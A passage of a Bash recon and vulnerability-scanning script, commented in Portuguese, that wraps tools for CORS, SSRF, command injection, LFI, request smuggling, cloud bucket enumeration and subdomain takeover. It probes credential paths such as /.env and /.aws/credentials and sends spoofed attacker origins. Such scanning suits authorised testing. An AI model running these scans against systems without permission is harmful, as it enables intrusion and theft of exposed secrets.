        log_error "[!] GraphQL introspection GLOBAL TIMEOUT (${global_timeout}s) - Killing remaining processes"
        kill -TERM "$subshell_pid" 2>/dev/null || true
        wait "$subshell_pid" 2>/dev/null || true
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] GLOBAL TIMEOUT: GraphQL introspection exceeded ${global_timeout}s" >> "$temp_dir/graphql_timeouts.log"
    else
        wait "$subshell_pid" 2>/dev/null || true
    fi
    
    # ============= LAZY DIRECTORY CREATION =============
    # APENAS cria diretórios permanentes se houver resultados válidos
    
    local has_results=false
    
    # Verificar se há vulnerabilidades
    if [[ -s "$vulnerable_file" ]]; then
        has_results=true
    fi
    
    # Verificar se há arquivos JSON com dados úteis
    if ls "$temp_dir"/introspection_*.json >/dev/null 2>&1; then
        for f in "$temp_dir"/introspection_*.json; do
            if [[ -s "$f" ]]; then
                has_results=true
                break
            fi
        done
    fi
    
    if [[ "$has_results" = true ]]; then
        # AGORA criar diretórios permanentes
        mkdir -p reports/graphql logs
        
        # Mover arquivos úteis
        if [[ -s "$vulnerable_file" ]]; then
            mv "$vulnerable_file" reports/graphql/vulnerable_endpoints.txt
        fi
        
        # Mover JSONs válidos (não vazios)
        for f in "$temp_dir"/introspection_*.json; do
            [[ -s "$f" ]] && mv "$f" reports/graphql/
        done
        
        # Mover logs de erro/timeout
        [[ -s "$temp_dir/graphql_timeouts.log" ]] && mkdir -p logs && mv "$temp_dir/graphql_timeouts.log" logs/
        [[ -s "$temp_dir/graphql_errors.log" ]] && mkdir -p logs && mv "$temp_dir/graphql_errors.log" logs/
        
        local vuln_count=$(wc -l < reports/graphql/vulnerable_endpoints.txt 2>/dev/null || echo 0)
        log_success "🎯 $vuln_count GraphQL endpoints with introspection enabled"
        
        if [[ "$vuln_count" -gt 0 ]]; then
            send_notification "🚨 *GRAPHQL VULNERABILITY*
🎯 $vuln_count endpoints with introspection enabled!
📄 See: reports/graphql/vulnerable_endpoints.txt" "true"
        fi
    else
        log_info "⚠️  GraphQL scan completed - No vulnerabilities found (no directories created)"
        # Mover apenas logs de erro/timeout se existirem
        if [[ -s "$temp_dir/graphql_timeouts.log" ]] || [[ -s "$temp_dir/graphql_errors.log" ]]; then
            mkdir -p logs
            [[ -s "$temp_dir/graphql_timeouts.log" ]] && mv "$temp_dir/graphql_timeouts.log" logs/
            [[ -s "$temp_dir/graphql_errors.log" ]] && mv "$temp_dir/graphql_errors.log" logs/
        fi
    fi
    
    # Limpar diretório temporário
    rm -rf "$temp_dir"
    
    # Report any timeouts (se logs foram movidos)
    if [[ -s logs/graphql_timeouts.log ]]; then
        local timeout_count=$(wc -l < logs/graphql_timeouts.log)
        log_warn "⚠️  $timeout_count GraphQL endpoints timed out (see logs/graphql_timeouts.log)"
    fi
}

# ============= CORS TESTING (LAZY CREATION + TIMEOUTS) =============
run_cors_testing() {
    # FAIL-FAST: Verificar input
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando CORS testing"
        return 0
    fi
    
    log_info "🔥 Executando CORS Testing (Lazy Mode)..."
    
    # Criar diretório temporário
    local temp_dir=$(mktemp -d /tmp/cors_scan_XXXXXX)
    local vulnerable_file="$temp_dir/vulnerable_cors.txt"
    local corsy_file="$temp_dir/corsy_results.json"
    local errors_file="$temp_dir/cors_errors.log"
    local timeouts_file="$temp_dir/cors_timeouts.log"
    
    # Timeout settings
    local req_timeout=15          # Per-request timeout (15 seconds)
    local connect_timeout=5       # Connect timeout (5 seconds)
    local global_timeout=1200     # Global timeout (20 min)
    local max_hosts=20
    [[ "$PROFILE" = "aggressive" ]] && max_hosts=50
    [[ "$PROFILE" = "kamikaze" ]] && max_hosts=100
    
    # Usar corsy se disponível (com timeout)
    if command -v corsy >/dev/null 2>&1; then
        log_info "▶️  Usando Corsy para testes avançados..."
        timeout 600s corsy -i alive/hosts.txt \
            -t 50 \
            -o "$corsy_file" 2>>"$errors_file" || true
    fi
    
    # Testes manuais de CORS com timeouts
    log_info "▶️  Executando testes manuais de CORS..."
    
    local test_origins=(
        "null"
        "https://evil.com"
        "https://attacker.com"
        "http://localhost"
        "https://trusted-domain.evil.com"
    )
    
    local count=0
    local total_hosts=$(head -n "$max_hosts" alive/hosts.txt | wc -l)
    
    (
        head -n "$max_hosts" alive/hosts.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            [[ -z "$url" ]] && continue
            
            count=$((count + 1))
            log_info "[$count/$total_hosts] CORS Testing: $url"
            
            for origin in "${test_origins[@]}"; do
                # Timeout wrapper para evitar travamentos em WAFs
                if command -v timeout >/dev/null 2>&1; then
                    response=$(timeout "${req_timeout}s" curl -s -I "$url" \
                        -H "Origin: $origin" \
                        -H "User-Agent: Mozilla/5.0" \
                        --connect-timeout "$connect_timeout" \
                        --max-time "$req_timeout" \
                        2>/dev/null) || {
                        local exit_code=$?
                        if [[ $exit_code -eq 124 ]]; then
                            echo "[$(date '+%Y-%m-%d %H:%M:%S')] TIMEOUT: $url (origin: $origin)" >> "$timeouts_file"
                        fi
                        continue
                    }
                else
                    response=$(curl -s -I "$url" \
                        -H "Origin: $origin" \
                        -H "User-Agent: Mozilla/5.0" \
                        --connect-timeout "$connect_timeout" \
                        --max-time "$req_timeout" \
                        2>/dev/null) || continue
                fi
                
                if echo "$response" | grep -qi "access-control-allow-origin: $origin"; then
                    echo "VULNERABLE: $url reflects origin: $origin" >> "$vulnerable_file"
                    log_warn "⚠️  CORS misconfiguration: $url reflects $origin"
                elif echo "$response" | grep -qi "access-control-allow-origin: \*"; then
                    echo "VULNERABLE: $url allows wildcard origin" >> "$vulnerable_file"
                    log_warn "⚠️  CORS wildcard: $url allows any origin"
                fi
            done
        done
    ) &
    
    # Wait with global timeout
    local subshell_pid=$!
    if ! timeout "${global_timeout}s" tail --pid="$subshell_pid" -f /dev/null 2>/dev/null; then
        log_error "[!] CORS testing GLOBAL TIMEOUT (${global_timeout}s) - Killing"
        kill -TERM "$subshell_pid" 2>/dev/null || true
        wait "$subshell_pid" 2>/dev/null || true
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] GLOBAL TIMEOUT: CORS testing exceeded ${global_timeout}s" >> "$timeouts_file"
    else
        wait "$subshell_pid" 2>/dev/null || true
    fi
    
    # ============= LAZY DIRECTORY CREATION =============
    local has_results=false
    
    # Verificar se há vulnerabilidades
    if [[ -s "$vulnerable_file" ]]; then
        has_results=true
    fi
    
    # Verificar resultados do Corsy
    if [[ -s "$corsy_file" ]]; then
        has_results=true
    fi
    
    if [[ "$has_results" = true ]]; then
        # Criar diretórios permanentes
        mkdir -p reports/cors logs
        
        # Mover arquivos úteis
        [[ -s "$vulnerable_file" ]] && mv "$vulnerable_file" reports/cors/vulnerable_cors.txt
        [[ -s "$corsy_file" ]] && mv "$corsy_file" reports/cors/corsy_results.json
        [[ -s "$errors_file" ]] && mv "$errors_file" logs/cors_errors.log
        [[ -s "$timeouts_file" ]] && mv "$timeouts_file" logs/cors_timeouts.log
        
        local cors_count=$(wc -l < reports/cors/vulnerable_cors.txt 2>/dev/null || echo 0)
        log_success "🎯 $cors_count CORS misconfigurations encontrados"
        
        if [[ "$cors_count" -gt 0 ]]; then
            send_notification "🚨 *CORS VULNERABILITY*
🎯 $cors_count CORS misconfigurations!
📄 Veja: reports/cors/vulnerable_cors.txt" "true"
        fi
    else
        log_info "⚠️  CORS scan completed - No vulnerabilities found (no directories created)"
        # Mover logs se existirem
        if [[ -s "$timeouts_file" ]] || [[ -s "$errors_file" ]]; then
            mkdir -p logs
            [[ -s "$timeouts_file" ]] && mv "$timeouts_file" logs/cors_timeouts.log
            [[ -s "$errors_file" ]] && mv "$errors_file" logs/cors_errors.log
        fi
    fi
    
    # Limpar temp
    rm -rf "$temp_dir"
    
    # Report timeouts
    if [[ -s logs/cors_timeouts.log ]]; then
        local timeout_count=$(wc -l < logs/cors_timeouts.log)
        log_warn "⚠️  $timeout_count CORS requests timed out (see logs/cors_timeouts.log)"
    fi
}

# ============= MULTI-CLOUD ENUMERATION (AWS/AZURE/GCP) =============
run_multicloud_enum() {
    log_info "🔥 Executando Multi-Cloud Enumeration..."
    mkdir -p reports/cloud/{aws,azure,gcp} logs
    
    if [[ ! -s alive/hosts_only.txt ]]; then
        log_info "⚠️  Nenhum host - pulando cloud enum"
        return 0
    fi
    
    # Extrair keywords dos domínios
    head -20 alive/hosts_only.txt | sed 's/\.com.*//;s/\..*$//;s/-/ /g' | \
        tr ' ' '\n' | grep -v "^$" | sort -u > reports/cloud/keywords.txt
    
    # AWS S3 Buckets
    log_info "☁️  Enumerando AWS S3 buckets..."
    while read -r keyword; do
        for suffix in "" "-dev" "-prod" "-staging" "-backup" "-test" "-files" "-assets" "-uploads"; do
            bucket="${keyword}${suffix}"
            
            # Testar se bucket existe
            response=$(timeout 5s curl -s -I "https://${bucket}.s3.amazonaws.com" 2>/dev/null || true)
            if echo "$response" | grep -q "200 OK\|403 Forbidden"; then
                echo "$bucket" >> reports/cloud/aws/s3_buckets_found.txt
                log_info "✅ S3 Bucket encontrado: $bucket"
                
                # Testar se é público
                if timeout 5s aws s3 ls "s3://${bucket}" --no-sign-request 2>/dev/null; then
                    echo "$bucket (PUBLIC)" >> reports/cloud/aws/s3_public_buckets.txt
                    log_warn "🚨 S3 Bucket PÚBLICO: $bucket"
                fi
            fi
        done
    done < reports/cloud/keywords.txt
    
    # Azure Storage
    log_info "☁️  Enumerando Azure Storage accounts..."
    while read -r keyword; do
        for suffix in "" "dev" "prod" "staging" "backup" "test"; do
            storage="${keyword}${suffix}"
            
            # Testar Azure Blob Storage
            response=$(timeout 5s curl -s -I "https://${storage}.blob.core.windows.net" 2>/dev/null || true)
            if echo "$response" | grep -q "Server: Windows-Azure"; then
                echo "$storage" >> reports/cloud/azure/storage_accounts_found.txt
                log_info "✅ Azure Storage encontrado: $storage"
            fi
        done
    done < reports/cloud/keywords.txt
    
    # GCP Storage Buckets
    log_info "☁️  Enumerando GCP Storage buckets..."
    while read -r keyword; do
        for suffix in "" "-dev" "-prod" "-staging" "-backup" "-test"; do
            bucket="${keyword}${suffix}"
            
            # Testar GCP bucket
            response=$(timeout 5s curl -s -I "https://storage.googleapis.com/${bucket}" 2>/dev/null || true)
            if echo "$response" | grep -q "200 OK\|403 Forbidden"; then
                echo "$bucket" >> reports/cloud/gcp/gcs_buckets_found.txt
                log_info "✅ GCP Bucket encontrado: $bucket"
            fi
        done
    done < reports/cloud/keywords.txt
    
    # Consolidar resultados
    local aws_count=$(wc -l < reports/cloud/aws/s3_buckets_found.txt 2>/dev/null || echo 0)
    local azure_count=$(wc -l < reports/cloud/azure/storage_accounts_found.txt 2>/dev/null || echo 0)
    local gcp_count=$(wc -l < reports/cloud/gcp/gcs_buckets_found.txt 2>/dev/null || echo 0)
    local public_count=$(wc -l < reports/cloud/aws/s3_public_buckets.txt 2>/dev/null || echo 0)
    
    log_success "✅ Multi-Cloud Enumeration completo"
    log_info "📊 AWS S3: $aws_count buckets ($public_count públicos)"
    log_info "📊 Azure Storage: $azure_count accounts"
    log_info "📊 GCP Storage: $gcp_count buckets"
    
    if [[ "$public_count" -gt 0 ]]; then
        send_notification "🚨 *PUBLIC CLOUD STORAGE*
☁️ $public_count S3 buckets PÚBLICOS encontrados!
📄 Veja: reports/cloud/aws/s3_public_buckets.txt" "true"
    fi
}

# ============= CVSS AUTO-SCORING =============
run_cvss_scoring() {
    log_info "🔥 Executando CVSS Auto-Scoring..."
    mkdir -p reports/cvss
    
    # Criar arquivo de scores
    cat > reports/cvss/vulnerability_scores.txt <<'CVSSEOF'
# CVSS v3.1 Scores - Auto-Generated
# Format: Vulnerability | CVSS Score | Severity | Impact

=====================================
HIGH RISK VULNERABILITIES (CVSS ≥ 7.0)
=====================================
CVSSEOF
    
    # Analisar vulnerabilidades do Nuclei
    if [[ -s nuclei/nuclei_hosts_fast.txt ]]; then
        log_info "📊 Scoring Nuclei findings..."
        
        while read -r line; do
            # Determinar score baseado em severidade e tipo
            local score=0.0
            local severity="UNKNOWN"
            
            if echo "$line" | grep -qi "critical\|rce\|sqli\|command-injection"; then
                score=9.8
                severity="CRITICAL"
            elif echo "$line" | grep -qi "high\|xss\|ssrf\|xxe"; then
                score=7.5
                severity="HIGH"
            elif echo "$line" | grep -qi "medium\|lfi\|disclosure"; then
                score=5.3
                severity="MEDIUM"
            elif echo "$line" | grep -qi "low\|info"; then
                score=3.1
                severity="LOW"
            fi
            
            if [[ $(echo "$score >= 7.0" | bc 2>/dev/null || echo 0) -eq 1 ]]; then
                echo "$(echo $line | cut -c1-80) | CVSS: $score | $severity" >> reports/cvss/high_risk_vulns.txt
            fi
        done < nuclei/nuclei_hosts_fast.txt
    fi
    
    # Scoring de SQLi
    if [[ -s urls/sqli_validated.txt ]]; then
        local sqli_count=$(wc -l < urls/sqli_validated.txt)
        echo "SQL Injection ($sqli_count confirmed) | CVSS: 9.8 | CRITICAL | Full database compromise" >> reports/cvss/high_risk_vulns.txt
    fi
    
    # Scoring de XSS
    if [[ "${DALFOX_RESULTS:-0}" -gt 0 ]]; then
        echo "Cross-Site Scripting ($DALFOX_RESULTS confirmed) | CVSS: 7.1 | HIGH | Account takeover possible" >> reports/cvss/high_risk_vulns.txt
    fi
    
    # Scoring de Secrets
    if [[ "${TOTAL_SECRETS:-0}" -gt 0 ]]; then
        echo "Exposed Secrets ($TOTAL_SECRETS total) | CVSS: 8.2 | HIGH | Credential compromise" >> reports/cvss/high_risk_vulns.txt
    fi
    
    # Gerar relatório consolidado
    if [[ -s reports/cvss/high_risk_vulns.txt ]]; then
        local high_risk=$(wc -l < reports/cvss/high_risk_vulns.txt)
        cat reports/cvss/high_risk_vulns.txt >> reports/cvss/vulnerability_scores.txt
        
        # Calcular score médio
        log_success "✅ CVSS Scoring completo - $high_risk vulnerabilidades de alto risco"
    fi
}

# ============= MEG - Fetch many paths for many hosts =============
run_meg() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando meg"
        return 0
    fi
    
    if ! command -v meg >/dev/null 2>&1; then
        log_info "⚠️  meg não instalado"
        log_info "💡 Instale com: go install github.com/tomnomnom/meg@latest"
        return 0
    fi
    
    log_info "🔥 Executando Meg para path discovery..."
    mkdir -p reports/meg
    
    # Criar wordlist de paths interessantes
    cat > reports/meg/interesting_paths.txt <<'MEGPATHS'
/.git/config
/.env
/.aws/credentials
/robots.txt
/sitemap.xml
/swagger.json
/api/swagger.json
/graphql
/admin
/api/v1
/api/v2
/debug
/phpinfo.php
/server-status
/trace.axd
MEGPATHS
    
    timeout 600s meg -v -c 100 \
        reports/meg/interesting_paths.txt \
        alive/hosts.txt \
        reports/meg/output 2>/dev/null || true
    
    # Filtrar resultados interessantes
    if [[ -d reports/meg/output ]]; then
        grep -r "200\|301\|302" reports/meg/output/ 2>/dev/null | \
            grep -v "404\|403" > reports/meg/interesting_findings.txt || true
        local findings=$(wc -l < reports/meg/interesting_findings.txt 2>/dev/null || echo 0)
        log_success "✅ Meg encontrou $findings paths interessantes"
    fi
}

# ============= JAELES - Automated Web Hacking Framework =============
run_jaeles() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando jaeles"
        return 0
    fi
    
    if ! command -v jaeles >/dev/null 2>&1; then
        log_info "⚠️  jaeles não instalado"
        log_info "💡 Instale com: go install github.com/jaeles-project/jaeles@latest"
        return 0
    fi
    
    log_info "🔥 Executando Jaeles Automated Hacking..."
    mkdir -p reports/jaeles logs
    
    # Atualizar signatures
    jaeles config init 2>/dev/null || true
    jaeles config reload 2>/dev/null || true
    
    # Executar com signatures de vulnerabilidades comuns
    timeout 1800s jaeles scan \
        -u alive/hosts.txt \
        -s ~/jaeles-signatures/ \
        -o reports/jaeles/findings.txt \
        -c 50 \
        --quiet \
        2>>logs/jaeles_errors.log || true
    
    if [[ -s reports/jaeles/findings.txt ]]; then
        local jaeles_vulns=$(wc -l < reports/jaeles/findings.txt)
        log_success "✅ Jaeles encontrou $jaeles_vulns vulnerabilidades"
    fi
}

# ============= ARJUN PARAMETER BRUTEFORCE MELHORADO =============
run_arjun_brutal() {
    if [[ ! -s urls/with_params.txt ]]; then
        log_info "⚠️  Nenhuma URL parametrizada - pulando arjun"
        return 0
    fi
    
    if ! command -v arjun >/dev/null 2>&1; then
        log_info "⚠️  arjun não instalado"
        log_info "💡 Instale com: pip3 install arjun"
        return 0
    fi
    
    log_info "🔥 Executando Arjun Parameter Discovery BRUTAL..."
    mkdir -p reports/arjun logs
    
    # Criar wordlist customizada gigante
    cat > reports/arjun/huge-params.txt <<'ARJUNPARAMS'
id
user
username
email
password
token
api_key
apikey
key
secret
url
file
path
page
redirect
return
callback
continue
next
debug
admin
test
demo
data
json
xml
ARJUNPARAMS
    
    local max_urls=30
    [[ "$PROFILE" = "aggressive" ]] && max_urls=60
    [[ "$PROFILE" = "kamikaze" ]] && max_urls=100
    
    local count=0
    head -n "$max_urls" urls/with_params.txt | while IFS= read -r url || [[ -n "$url" ]]; do
        count=$((count + 1))
        safe=$(echo "$url" | md5sum | cut -c1-8)
        log_info "[$count/$max_urls] Arjun: $url"
        
        timeout 300s arjun -u "$url" \
            -w reports/arjun/huge-params.txt \
            -t 50 \
            --stable \
            -oJ "reports/arjun/params_${safe}.json" \
            2>>logs/arjun_errors.log || true
    done
    
    # Consolidar parâmetros encontrados
    if ls reports/arjun/params_*.json >/dev/null 2>&1; then
        jq -r '.parameters[]' reports/arjun/params_*.json 2>/dev/null | \
            sort -u > reports/arjun/all_parameters.txt || true
        local param_count=$(wc -l < reports/arjun/all_parameters.txt 2>/dev/null || echo 0)
        log_success "✅ Arjun descobriu $param_count parâmetros ocultos"
    fi
}

# Exportar funções para uso externo
export -f run_ffuf_param_fuzz
export -f run_ffuf_dir_fuzz
export -f run_graphql_introspection
export -f run_cors_testing
export -f run_multicloud_enum
export -f run_cvss_scoring
export -f run_meg
export -f run_arjun_brutal

log_info "✅ Extensions Pt.1 carregadas"


# ============= CVSS AUTO-SCORING =============
calc_cvss() {
    log_info "📊 Calculando CVSS scores..."
    mkdir -p reports
    
    local crit=$(safe_count nuclei/critical.txt 2>/dev/null || echo 0)
    local high=$(safe_count nuclei/high.txt 2>/dev/null || echo 0)
    local medium=$(safe_count nuclei/medium.txt 2>/dev/null || echo 0)
    
    # Se não existirem, tentar contar das outras fontes
    if [[ $crit -eq 0 ]] && [[ $high -eq 0 ]]; then
        crit=$(grep -rh "critical" nuclei/ 2>/dev/null | wc -l || echo 0)
        high=$(grep -rh "high" nuclei/ 2>/dev/null | wc -l || echo 0)
        medium=$(grep -rh "medium" nuclei/ 2>/dev/null | wc -l || echo 0)
    fi
    
    local sqli=$(safe_count urls/sqli_validated.txt 2>/dev/null || echo 0)
    local xss=$(safe_count reports/xspear/xss_vulnerabilities.txt 2>/dev/null || echo 0)
    local secrets=$(safe_count secrets/aws_keys.txt 2>/dev/null || echo 0)
    
    # Garantir que todas as variáveis sejam numéricas usando ensure_numeric()
    crit=$(ensure_numeric "$crit" 0)
    high=$(ensure_numeric "$high" 0)
    medium=$(ensure_numeric "$medium" 0)
    sqli=$(ensure_numeric "$sqli" 0)
    xss=$(ensure_numeric "$xss" 0)
    secrets=$(ensure_numeric "$secrets" 0)
    
    # Calcular score (0-100) - divisor nunca é zero
    local divisor=10
    local raw_score=$(( crit*95 + high*70 + medium*40 + sqli*85 + xss*60 + secrets*75 ))
    local score=$(( raw_score / divisor ))
    [[ $score -gt 100 ]] && score=100
    
    # Determinar severidade
    local severity="LOW"
    local color="🟢"
    if [[ $score -ge 70 ]]; then
        severity="CRITICAL"
        color="🔴"
    elif [[ $score -ge 40 ]]; then
        severity="HIGH"
        color="🟠"
    elif [[ $score -ge 20 ]]; then
        severity="MEDIUM"
        color="🟡"
    fi
    
    cat > reports/cvss_score.txt <<CVSS
========================================
📊 CVSS RISK SCORE ANALYSIS
========================================
Overall Score: $score/100
Severity Level: $color $severity

Breakdown:
- Critical Findings: $crit (weight: 95%)
- High Findings: $high (weight: 70%)
- Medium Findings: $medium (weight: 40%)
- SQLi Validated: $sqli (weight: 85%)
- XSS Confirmed: $xss (weight: 60%)
- Secrets Exposed: $secrets (weight: 75%)

Risk Matrix:
- 70-100: 🔴 CRITICAL (Immediate action required)
- 40-69:  🟠 HIGH (Urgent remediation needed)
- 20-39:  🟡 MEDIUM (Schedule remediation)
- 0-19:   🟢 LOW (Monitor and review)

Generated: $(date -u)
========================================
CVSS
    
    log_success "✅ CVSS Score: $score/100 ($severity)"
    echo "$score"
}

# ============= COMMIX - Command Injection =============
run_commix() {
    if [[ ! -s urls/with_params.txt ]]; then
        log_info "⚠️  Nenhuma URL parametrizada - pulando commix"
        return 0
    fi
    
    if command -v commix >/dev/null 2>&1; then
        log_info "▶️  Executando commix para command injection..."
        mkdir -p reports/commix
        
        head -5 urls/with_params.txt | while read -r url; do
            safe_name=$(echo "$url" | md5sum | cut -c1-8)
            timeout 180s commix --url="$url" --batch --output-dir="reports/commix" > reports/commix/commix_${safe_name}.txt 2>&1 || true
        done
        
        log_info "✅ commix completo"
    fi
}

# ============= LFISUITE - LFI Scanner =============
run_lfisuite() {
    if [[ ! -s urls/gf_lfi.txt ]]; then
        log_info "⚠️  Nenhum candidato LFI - pulando lfisuite"
        return 0
    fi
    
    if command -v lfisuite >/dev/null 2>&1; then
        log_info "▶️  Executando lfisuite..."
        mkdir -p reports/lfisuite
        
        head -10 urls/gf_lfi.txt | while read -r url; do
            safe_name=$(echo "$url" | md5sum | cut -c1-8)
            timeout 120s lfisuite -u "$url" -o reports/lfisuite/lfi_${safe_name}.txt 2>/dev/null || true
        done
        
        log_info "✅ lfisuite completo"
    fi
}

# ============= SMUGGLER - HTTP Request Smuggling =============
run_smuggler() {
    if [[ ! -s alive/hosts.txt ]]; then
        log_info "⚠️  Nenhum host - pulando smuggler"
        return 0
    fi
    
    if command -v smuggler >/dev/null 2>&1; then
        log_info "▶️  Executando smuggler para HTTP request smuggling..."
        mkdir -p reports/smuggler
        
        timeout 600s smuggler -u alive/hosts.txt -o reports/smuggler/smuggling_results.txt 2>/dev/null || true
        log_info "✅ smuggler completo"
    fi
}

# ============= SSRFMAP - SSRF Testing (LAZY CREATION + TIMEOUTS) =============
run_ssrfmap() {
    # FAIL-FAST: Verificar input
    if [[ ! -s urls/gf_ssrf.txt ]]; then
        log_info "⚠️  Nenhum candidato SSRF - pulando ssrfmap"
        return 0
    fi
    
    if ! command -v ssrfmap >/dev/null 2>&1; then
        log_info "⚠️  ssrfmap não instalado - pulando"
        return 0
    fi
    
    log_info "🔥 Executando SSRF Testing (Lazy Mode)..."
    
    # Criar diretório temporário
    local temp_dir=$(mktemp -d /tmp/ssrf_scan_XXXXXX)
    local results_dir="$temp_dir/results"
    local vulnerable_file="$temp_dir/ssrf_vulnerable.txt"
    local errors_file="$temp_dir/ssrf_errors.log"
    local timeouts_file="$temp_dir/ssrf_timeouts.log"
    
    mkdir -p "$results_dir"
    
    # Timeout settings
    local req_timeout=300         # Per-request timeout (5 min)
    local connect_timeout=10      # Connect timeout
    local global_timeout=1800     # Global timeout (30 min)
    local max_urls=10
    [[ "$PROFILE" = "aggressive" ]] && max_urls=25
    [[ "$PROFILE" = "kamikaze" ]] && max_urls=50
    
    local count=0
    local total_urls=$(head -n "$max_urls" urls/gf_ssrf.txt | wc -l)
    
    (
        head -n "$max_urls" urls/gf_ssrf.txt | while IFS= read -r url || [[ -n "$url" ]]; do
            [[ -z "$url" ]] && continue
            
            count=$((count + 1))
            safe_name=$(echo "$url" | md5sum | cut -c1-8)
            log_info "[$count/$total_urls] SSRF Testing: $url"
            
            local output_file="$results_dir/ssrf_${safe_name}.txt"
            
            # Executar ssrfmap com timeout
            if command -v timeout >/dev/null 2>&1; then
                timeout "${req_timeout}s" ssrfmap -r "$url" -p payloads --output "$output_file" 2>>"$errors_file"
            else
                ssrfmap -r "$url" -p payloads --output "$output_file" 2>>"$errors_file" &
                local pid=$!
                sleep "${req_timeout}"
                kill -0 "$pid" 2>/dev/null && kill -TERM "$pid" 2>/dev/null
                wait "$pid" 2>/dev/null || true
            fi
            
            local exit_code=$?
            if [[ $exit_code -eq 124 ]]; then
                log_warn "[!] SSRF TIMEOUT (${req_timeout}s) for: $url - Skipping"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] TIMEOUT: $url" >> "$timeouts_file"
                # Remover arquivo vazio
                [[ -f "$output_file" ]] && [[ ! -s "$output_file" ]] && rm -f "$output_file"
                continue
            fi
            
            # Verificar se encontrou algo
            if [[ -s "$output_file" ]]; then
                if grep -qiE "vulnerable|ssrf|confirmed|success" "$output_file"; then
                    echo "$url" >> "$vulnerable_file"
                    log_warn "🚨 SSRF potential vulnerability: $url"
                fi
            else
                # Remover arquivo vazio
                [[ -f "$output_file" ]] && rm -f "$output_file"
            fi
        done
    ) &
    
    # Wait with global timeout
    local subshell_pid=$!
    if ! timeout "${global_timeout}s" tail --pid="$subshell_pid" -f /dev/null 2>/dev/null; then
        log_error "[!] SSRF testing GLOBAL TIMEOUT (${global_timeout}s) - Killing"
        kill -TERM "$subshell_pid" 2>/dev/null || true
        wait "$subshell_pid" 2>/dev/null || true
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] GLOBAL TIMEOUT: SSRF testing exceeded ${global_timeout}s" >> "$timeouts_file"
    else
        wait "$subshell_pid" 2>/dev/null || true
    fi
    
    # ============= LAZY DIRECTORY CREATION =============
    local has_results=false
    
    # Verificar se há resultados em qualquer arquivo
    if [[ -s "$vulnerable_file" ]]; then
        has_results=true
    fi
    
    # Verificar arquivos de resultado não vazios
    if ls "$results_dir"/*.txt >/dev/null 2>&1; then
        for f in "$results_dir"/*.txt; do
            if [[ -s "$f" ]]; then
                has_results=true
                break
            fi
        done
    fi
    
    if [[ "$has_results" = true ]]; then
        # Criar diretórios permanentes
        mkdir -p reports/ssrfmap logs
        
        # Mover arquivos úteis (não vazios)
        for f in "$results_dir"/*.txt; do
            [[ -s "$f" ]] && mv "$f" reports/ssrfmap/
        done
        
        [[ -s "$vulnerable_file" ]] && mv "$vulnerable_file" reports/ssrfmap/ssrf_vulnerable.txt
        [[ -s "$errors_file" ]] && mv "$errors_file" logs/ssrf_errors.log
        [[ -s "$timeouts_file" ]] && mv "$timeouts_file" logs/ssrf_timeouts.log
        
        local vuln_count=$(wc -l < reports/ssrfmap/ssrf_vulnerable.txt 2>/dev/null || echo 0)
        local file_count=$(ls reports/ssrfmap/*.txt 2>/dev/null | wc -l || echo 0)
        log_success "✅ SSRF scan completo - $file_count resultados, $vuln_count potenciais vulnerabilidades"
        
        if [[ "$vuln_count" -gt 0 ]]; then
            send_notification "🚨 *SSRF VULNERABILITY*
🎯 $vuln_count potenciais SSRF encontrados!
📄 Veja: reports/ssrfmap/" "true"
        fi
    else
        log_info "⚠️  SSRF scan completed - No results (no directories created)"
        # Mover logs se existirem
        if [[ -s "$timeouts_file" ]] || [[ -s "$errors_file" ]]; then
            mkdir -p logs
            [[ -s "$timeouts_file" ]] && mv "$timeouts_file" logs/ssrf_timeouts.log
            [[ -s "$errors_file" ]] && mv "$errors_file" logs/ssrf_errors.log
        fi
    fi
    
    # Limpar temp
    rm -rf "$temp_dir"
    
    # Report timeouts
    if [[ -s logs/ssrf_timeouts.log ]]; then
        local timeout_count=$(wc -l < logs/ssrf_timeouts.log)
        log_warn "⚠️  $timeout_count SSRF requests timed out (see logs/ssrf_timeouts.log)"
    fi
}

# ============= SUBDOMAIN TAKEOVER (LAZY CREATION + TIMEOUTS) =============
run_takeover_checks() {
    # FAIL-FAST: Verificar input
    if [[ ! -s subs/all_subs.txt ]]; then
        log_info "⚠️  Nenhum subdomínio - pulando takeover checks"
        return 0
    fi
    
    log_info "🔥 Executando Subdomain Takeover Checks (Lazy Mode)..."
    
    # Criar diretório temporário
    local temp_dir=$(mktemp -d /tmp/takeover_scan_XXXXXX)
    local vulnerable_file="$temp_dir/takeover_vulnerable.txt"
    local subjack_file="$temp_dir/subjack_results.json"
    local errors_file="$temp_dir/takeover_errors.log"
    local timeouts_file="$temp_dir/takeover_timeouts.log"
    
    # Timeout settings
    local req_timeout=30          # Per-subdomain timeout
    local global_timeout=1800     # Global timeout (30 min)
    local max_subs=100
    [[ "$PROFILE" = "aggressive" ]] && max_subs=500
    [[ "$PROFILE" = "kamikaze" ]] && max_subs=1000
    
    # Usar subjack se disponível
    if command -v subjack >/dev/null 2>&1; then
        log_info "▶️  Usando Subjack para verificação..."
        
        # Preparar arquivo de entrada limitado
        head -n "$max_subs" subs/all_subs.txt > "$temp_dir/subs_to_check.txt"
        
        timeout "${global_timeout}s" subjack \
            -w "$temp_dir/subs_to_check.txt" \
            -t 50 \
            -timeout 30 \
            -ssl \
            -o "$subjack_file" \
            -v 2>>"$errors_file" || {
                local exit_code=$?
                if [[ $exit_code -eq 124 ]]; then
                    log_warn "[!] Subjack GLOBAL TIMEOUT (${global_timeout}s)"
                    echo "[$(date '+%Y-%m-%d %H:%M:%S')] GLOBAL TIMEOUT: subjack" >> "$timeouts_file"
                fi
            }
    fi
    
    # Verificações manuais de CNAME para serviços conhecidos
    log_info "▶️  Executando verificações manuais de CNAME..."
    
    local takeover_patterns=(
        "github.io:There isn't a GitHub Pages site here"
        "herokuapp.com:No such app"
        "pantheonsite.io:404 error unknown site"
        "amazonaws.com:NoSuchBucket"
        "cloudfront.net:Bad Request"
        "azure-api.net:404 Web Site not found"
        "azurewebsites.net:404 Web Site not found"
        "cloudapp.net:404"
        "s3.amazonaws.com:NoSuchBucket"
        "shopify.com:Sorry, this shop is currently unavailable"
        "fastly.net:Fastly error: unknown domain"
        "ghost.io:The thing you were looking for is no longer here"
